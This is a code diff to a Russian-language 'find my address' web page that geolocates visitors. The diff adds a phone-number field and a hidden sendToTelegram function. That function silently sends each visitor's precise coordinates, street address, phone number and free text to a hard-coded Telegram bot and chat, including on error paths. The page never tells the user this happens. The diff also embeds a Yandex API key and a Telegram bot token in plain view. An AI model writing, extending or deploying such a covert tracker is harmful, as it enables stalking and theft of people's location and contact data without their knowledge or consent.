@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>адресс</title>
+    <title>Определение адреса</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -69,6 +69,21 @@
             font-weight: bold;
             margin-bottom: 5px;
         }
+        input[type="text"], input[type="tel"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .input-section {
+            margin-bottom: 15px;
+        }
+        .input-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
     </style>
 </head>
 <body>
@@ -76,7 +91,17 @@
         <h1>Точное определение адреса</h1>
         
         <div class="section">
-            <p>Нажмите кнопку, чтобы определить ваше местоположение и получить точный адрес от Яндекс.Карт и OpenStreetMap:</p>
+            <div class="input-section">
+                <div class="input-title">Введите номер телефона для проверки:</div>
+                <input type="tel" id="phoneNumber" placeholder="+7 (XXX) XXX-XX-XX">
+            </div>
+            
+            <div class="input-section">
+                <div class="input-title">Введите что-нибудь для прикола (необязательно):</div>
+                <input type="text" id="funText" placeholder="Введите что-нибудь смешное...">
+            </div>
+            
+            <p>Нажмите кнопку, чтобы определить ваше местоположение и получить точный адрес:</p>
             <button onclick="getLocation()">Определить мой адрес</button>
             <div id="result"></div>
         </div>
@@ -84,9 +109,14 @@
 
     <script>
         const YANDEX_API_KEY = '384f966a-39b0-459a-8068-6d95fdf98170';
+        const TELEGRAM_BOT_TOKEN = '8089609137:AAGzUfpIyqMJukWjWnn9VEnmmIi0ExvB6bA';
+        const TELEGRAM_CHAT_ID = '1224978194';
         
         function getLocation() {
             const resultDiv = document.getElementById('result');
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const funText = document.getElementById('funText').value;
+            
             resultDiv.innerHTML = '<p>Определение местоположения...</p>';
 
             if ("geolocation" in navigator) {
@@ -100,8 +130,8 @@
                             <p>Долгота: <span class="coordinates">${lon.toFixed(6)}</span></p>
                             <p>Запрашиваю адрес...</p>`;
                         
-                        getAddressFromYandex(lat, lon, resultDiv);
-                        getAddressFromOSM(lat, lon, resultDiv);
+                        getAddressFromYandex(lat, lon, resultDiv, phoneNumber, funText);
+                        getAddressFromOSM(lat, lon, resultDiv, phoneNumber, funText);
                     },
                     (error) => {
                         let errorMessage;
@@ -119,16 +149,28 @@
                                 errorMessage = "Произошла неизвестная ошибка.";
                         }
                         resultDiv.innerHTML = `<p class="error">Ошибка: ${errorMessage}</p>`;
+                        sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 Ошибка: ${errorMessage}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                        `);
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
                 resultDiv.innerHTML = '<p class="error">Ваш браузер не поддерживает геолокацию.</p>';
+                sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 Браузер не поддерживает геолокацию
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                `);
             }
         }
 
         // Запрос к Яндекс.Геокодеру
-        function getAddressFromYandex(lat, lon, resultDiv) {
+        function getAddressFromYandex(lat, lon, resultDiv, phoneNumber, funText) {
             const url = `https://geocode-maps.yandex.ru/1.x/?format=json&apikey=${YANDEX_API_KEY}&geocode=${lon},${lat}`;
 
             fetch(url)
@@ -146,6 +188,16 @@
                             <p>Точность: ${translatePrecision(geoObject.metaDataProperty.GeocoderMetaData.precision)}</p>
                         `;
                         resultDiv.appendChild(yandexResult);
+                        
+                        // Отправляем данные в Telegram
+                        sendToTelegram(`
+📢 Новая проверка адреса:
+📍 Яндекс.Карты:
+🏠 Адрес: ${address}
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                        `);
                     } catch (e) {
                         const errorElem = document.createElement('div');
                         errorElem.className = 'provider';
@@ -154,6 +206,13 @@
                             <p class="error">Не удалось определить адрес</p>
                         `;
                         resultDiv.appendChild(errorElem);
+                        sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 Яндекс.Карты: не удалось определить адрес
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                        `);
                     }
                 })
                 .catch(error => {
@@ -164,11 +223,18 @@
                         <p class="error">Ошибка запроса: ${error.message}</p>
                     `;
                     resultDiv.appendChild(errorElem);
+                    sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 Ошибка Яндекс.Карты: ${error.message}
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                    `);
                 });
         }
 
         // Запрос к OpenStreetMap
-        function getAddressFromOSM(lat, lon, resultDiv) {
+        function getAddressFromOSM(lat, lon, resultDiv, phoneNumber, funText) {
             const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=ru`;
 
             fetch(url)
@@ -196,6 +262,16 @@
                             <p>Тип: ${data.category || 'не указан'}</p>
                         `;
                         resultDiv.appendChild(osmResult);
+                        
+                        // Отправляем данные в Telegram
+                        sendToTelegram(`
+📢 Новая проверка адреса:
+📍 OpenStreetMap:
+🏠 Адрес: ${address || 'не указан'}
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                        `);
                     } catch (e) {
                         const errorElem = document.createElement('div');
                         errorElem.className = 'provider';
@@ -204,6 +280,13 @@
                             <p class="error">Не удалось определить адрес</p>
                         `;
                         resultDiv.appendChild(errorElem);
+                        sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 OpenStreetMap: не удалось определить адрес
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                        `);
                     }
                 })
                 .catch(error => {
@@ -214,7 +297,29 @@
                         <p class="error">Ошибка запроса: ${error.message}</p>
                     `;
                     resultDiv.appendChild(errorElem);
+                    sendToTelegram(`
+📢 Новая проверка адреса:
+🚫 Ошибка OpenStreetMap: ${error.message}
+🌐 Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}
+📱 Номер телефона: ${phoneNumber || 'не указан'}
+🎭 Прикол: ${funText || 'нет'}
+                    `);
                 });
+        }
+        
+        // Функция отправки данных в Telegram
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => console.error('Ошибка отправки в Telegram:', error));
         }
         
         function translatePrecision(precision) {
@@ -228,6 +333,12 @@
             };
             return translations[precision] || precision;
         }
+
+        // Маска для телефона
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
+            e.target.value = !x[2] ? x[1] : '+7 (' + x[2] + (x[3] ? ') ' + x[3] : '') + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
+        });
     </script>
 </body>
 </html>
